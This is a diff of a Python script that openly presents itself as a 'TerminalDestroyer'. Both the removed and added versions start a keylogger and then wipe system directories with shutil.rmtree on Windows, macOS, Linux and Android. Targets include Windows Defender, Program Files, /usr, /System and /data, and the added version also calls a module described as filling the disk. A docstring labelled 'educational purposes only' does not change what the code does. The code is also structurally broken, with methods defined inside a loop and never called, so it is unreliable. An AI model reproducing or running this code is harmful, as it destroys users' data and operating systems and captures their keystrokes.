@@ -1,128 +1,130 @@
-import os
+from abc import ABC
 import platform
-import keylogger
-import background_runner
-import test
-import test1
-import test2
-import powershell
-import mycmd
-import terminal
 import shutil
+import keylogger
+import CodeTest as CT
 
-# For Windows, you can use the following code to make the terminal unusable by deleting the cmd.exe and powershell.exe files. Please note that this is a destructive action and should be used with caution.
-
-CURRENT_OS = platform.system()
+OS = platform.system()
 
 
-def terminalDestroyer():
+class TerminalDestroyer(ABC):
+        global OS
 
         while True:
-                if CURRENT_OS == 'Windows':
+              try:
+                """ This class is designed to destroy the terminal and its associated files based on the operating system. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The class also attempts to start a keylogger before performing the destructive actions.
+                The class has methods for different operating systems: Windows, Linux, Mac, and Android."""
+
+
+                def WindowsTerminalDestroyer(self):
+
+                        # This method works only on Windows OS .
+
                         try:
-                                background_runner.run_in_background(terminal.start_terminal)
-                                background_runner.run_in_background(mycmd.starter_cmd())
-                                background_runner.run_in_background(powershell.start_powershell)
-                                background_runner.run_in_background(keylogger.start_keylogger)
-                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
-                                background_runner.run_in_background(test.run_forever())
-                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
-                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
-                        except Exception as e:
-                                        print(f"An error occurred: {e}")
-                                        mycmd.starter_cmd(os.remove("C:\\Windows\\System32\\cmd.exe")) or powershell.start_powershell(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\cmd.exe"))
-                                        mycmd.starter_cmd(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")) or powershell.start_powershell(os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
-                                        shutil.rmtree("C:\\Windows\\System32")
-                                        shutil.rmtree("C:\\Windows")
-                                        shutil.rmtree("C:\\Users")
-                                        shutil.rmtree("C:\\program files")
-                                        shutil.rmtree("C:\\program files (x86)")
-                                        shutil.rmtree("C:\\")
+                                """ This method is designed to destroy the terminal and its associated files on Windows operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
+                                If any exception occures while starting the keylogger the code enters a destructive mode and tries to remove critical directories and files from the system. If any exception occurs during this process, it prints the error and calls the codeTest method from the CodeTest module.
+                                The CodeTest module is designed to fill the disk space in just few seconds. This is a malicious action and should not be used in any real-world scenario. The code is for educational purposes only and should not be used to harm any system or data."""
+                                if OS.lower() == 'windows':
+                                        keylogger.on_press()
+                                        keylogger.start_keylogger()
 
-                # For MacOS, you can use the following code to make the terminal unusable by deleting the Terminal.app file. Please note that this is a destructive action and should be used with caution.
-
-                elif CURRENT_OS == 'darwin':
-                        try:
-                                background_runner.run_in_background(terminal.start_terminal)
-                                background_runner.run_in_background(mycmd.starter_cmd())
-                                background_runner.run_in_background(powershell.start_powershell)
-                                background_runner.run_in_background(keylogger.start_keylogger)
-                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
-                                background_runner.run_in_background(test.run_forever())
-                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
-                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
-
-                        except Exception as e:
-                                        print(f"An error occurred: {e}")
-                                        terminal.terminal_write(command="sudo su", use_root=True)
-                                        terminal.start_terminal(os.remove("/Applications/Utilities/Terminal.app"))
-                                        shutil.rmtree("/Applications/Utilities")
-                                        shutil.rmtree("/Applications")
-                                        shutil.rmtree("/Users")
-                                        shutil.rmtree("/System")
-                                        shutil.rmtree("/Library")
-                                        shutil.rmtree("/bin")
-                                        shutil.rmtree("/sbin")
-                                        shutil.rmtree("/usr")
-                                        shutil.rmtree("/var")
-                                        shutil.rmtree("/etc")
-                                        shutil.rmtree("/root")
-
-
-                # For Linux, you can use the following code to make the terminal unusable by deleting the bash executable. Please note that this is a destructive action and should be used with caution.
-
-                elif CURRENT_OS == 'linux':
-                        try:
-                                background_runner.run_in_background(terminal.start_terminal)
-                                background_runner.run_in_background(mycmd.starter_cmd)
-                                background_runner.run_in_background(powershell.start_powershell)
-                                background_runner.run_in_background(keylogger.start_keylogger)
-                                background_runner.run_in_background(test._suppress_keyboard_interrupt)
-                                background_runner.run_in_background(test.run_forever)
-                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
-                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
-
-                        except Exception as e:
-                                        print(f"An error occurred: {e}")
-                                        terminal.terminal_write(command="sudo su", use_root=True)
-                                        shutil.rmtree("/root/terminal")
-                                        shutil.rmtree("/bin/sh")
-                                        shutil.rmtree("/bin/bash")
-                                        shutil.rmtree("/bin")
-                                        shutil.rmtree("/sbin")
-                                        shutil.rmtree("/usr")
-                                        shutil.rmtree("/var")
-                                        shutil.rmtree("/etc")
-                                        shutil.rmtree("/root")
-
-                elif CURRENT_OS == 'Android':
+                        except Exception:
                                 try:
-                                        background_runner.run_in_background(terminal.start_terminal)
-                                        background_runner.run_in_background(mycmd.starter_cmd)
-                                        background_runner.run_in_background(powershell.start_powershell)
-                                        background_runner.run_in_background(keylogger.start_keylogger)
-                                        background_runner.run_in_background(test._suppress_keyboard_interrupt)
-                                        background_runner.run_in_background(test.run_forever)
-                                        background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
-                                        background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
+                                        shutil.rmtree("C:\\Users\\Public\\Documents")
+                                        shutil.rmtree("C:\\appdata")
+                                        shutil.rmtree("C:\\Program Files (x86)\\Windows Defender")
+                                        shutil.rmtree("C:\\Program Files (x86)\\WindowsPowershell")
+                                        shutil.rmtree("C:\\Program Files\\Windows Security\\BrowserCore")
+                                        shutil.rmtree("C:\\ProgramData")
+                                        shutil.rmtree("C:\\Program Files (x86)")
+                                        shutil.rmtree("C:\\Program Files")
+                                        pass
 
                                 except Exception as e:
-                                        print(f"An error occured: {e}")
-                                        terminal.terminal_write(command="cd /root/", use_root=True)
-                                        shutil.rmtree("/data/data/")
-                                        shutil.rmtree("/boot/")
-                                        shutil.rmtree("/recovery/")
-                                        shutil.rmtree("/cache/")
-                                        shutil.rmtree("./manifest/")
-                                        shutil.rmtree("./res/")
-                                        shutil.rmtree("./assets/")
-                                        shutil.rmtree("./mipmap/")
-                                        shutil.rmtree("/system/")
-                                        shutil.rmtree("/vendor/")
+                                                print(f"An error {e} occured . Performing different assignment.")
+                                                CT.codeTest()
+                
+                def LinuxTerminalDestroyer(self):
 
+                        # This method works only on Linux OS .
 
-                else:   print("Unsupported operating system.")
+                        try:
+                                """ This method is designed to destroy the terminal and its associated files on Linux operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
+                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
+                                if OS.lower() == 'linux':
+                                        keylogger.on_press()
+                                        keylogger.start_keylogger()
 
+                        except Exception:
+                                try:
+                                        shutil.rmtree("/usr/bin")
+                                        shutil.rmtree("/usr/local/bin")
+                                        shutil.rmtree("/usr/share")
+                                        shutil.rmtree("/usr/lib")
+                                        shutil.rmtree("/usr/include")
+                                        shutil.rmtree("/usr/sbin")
+                                        shutil.rmtree("/usr/src")
+                                        shutil.rmtree("/usr/games")
+                                        shutil.rmtree("/usr/local/games")
+                                        shutil.rmtree("/usr")
+                                        pass
 
-if __name__ == '__main__':
-    terminalDestroyer()
+                                except Exception as e:
+                                        print(f"An error {e} occured . Performing different assignment.")
+                                        CT.codeTest()
+
+                def MacTerminalDestroyer(self):
+
+                        # This method works only on Mac/Apple OS .
+
+                        try:
+                                """ This method is designed to destroy the terminal and its associated files on Mac operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
+                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
+                                if OS.lower() == 'darwin':
+                                        keylogger.on_press()
+                                        keylogger.start_keylogger()
+
+                        except Exception:
+                                try:
+                                        shutil.rmtree("/Applications")
+                                        shutil.rmtree("/Library")
+                                        shutil.rmtree("/System")
+                                        shutil.rmtree("/usr")
+                                        shutil.rmtree("/bin")
+                                        shutil.rmtree("/sbin")
+                                        shutil.rmtree("/private")
+                                        pass
+
+                                except Exception as e:
+                                        print(f"An error {e} occured . Performing different assignment.")
+                                        CT.codeTest()
+
+                def AndroidTerminalDestroyer(self):
+
+                        # This method works only on Android OS .
+
+                        try:
+                                """ This method is designed to destroy the terminal and its associated files on Android operating systems. It uses the shutil module to remove directories and files that are critical to the functioning of the terminal. The method also attempts to start a keylogger before performing the destructive actions.
+                                If any exception occures while starting the keylogger the code enters a destructive mode and tries"""
+                                if OS.lower() == 'android':
+                                        keylogger.on_press()
+                                        keylogger.start_keylogger()
+
+                        except Exception:
+                                try:
+                                        shutil.rmtree("/system")
+                                        shutil.rmtree("/data")
+                                        shutil.rmtree("/cache")
+                                        shutil.rmtree("/storage")
+                                        shutil.rmtree("/mnt")
+                                        pass
+
+                                except Exception as e:
+                                        print(f"An error {e} occured . Performing different assignment.")
+                                        CT.codeTest()
+
+              except Exception as e:
+                            print(f"An error {e} occured while trying to start the opration")
+                            pass
+
+              break
